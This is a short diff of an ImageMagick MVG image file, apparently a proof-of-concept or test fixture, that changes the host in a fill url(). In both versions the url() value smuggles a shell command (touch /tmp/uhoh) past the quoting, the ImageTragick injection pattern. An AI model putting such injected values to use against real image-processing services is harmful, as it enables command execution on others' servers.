@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://47.74.2.51:443/image.jpg";touch "/tmp/uhoh)'
+fill 'url(https://x/image.jpg";touch "/tmp/uhoh)'
 pop graphic-context
